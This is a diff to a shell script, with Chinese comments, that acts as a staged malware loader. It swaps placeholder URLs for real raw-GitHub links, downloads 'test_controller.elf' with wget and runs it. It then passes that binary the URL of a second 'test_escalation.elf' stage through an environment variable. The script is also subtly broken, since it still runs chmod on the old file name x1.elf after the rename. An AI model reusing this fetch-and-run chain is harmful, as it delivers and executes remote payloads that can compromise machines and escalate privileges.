@@ -8,17 +8,17 @@ mkdir -p "$TMPDIR" 2>/dev/null
 cd "$TMPDIR" || exit 1
 
 echo "[*] Downloading stage1..."
-URL1="https://example.com/x1.elf"
-URL2="https://example.com/x2.elf"          # ← 这个URL x1也要知道
+URL1="https://raw.githubusercontent.com/Jerryy959/controller/main/test_controller.elf"
+Test_escalation="https://raw.githubusercontent.com/Jerryy959/controller/main/test_escalation.elf"          # ← 这个URL x1也要知道
 
 # 只下载第一个阶段
-wget -q --no-cache "$URL1" -O x1.elf || exit 1
+wget -q --no-cache "$URL1" -O test_controller.elf || exit 1
 chmod +x x1.elf
 
 echo "[*] Launching stage1..."
 # 把第二阶段URL通过环境变量或参数传下去（看x1支不支持）
 # 方式A：环境变量（最常用）
-X2_URL="$URL2" ./x1.elf
+Escalation_URL="$Test_escalation" ./test_controller.elf
 
 # 方式B：命令行参数（如果x1支持）
 # ./x1.elf --next-stage "$URL2"
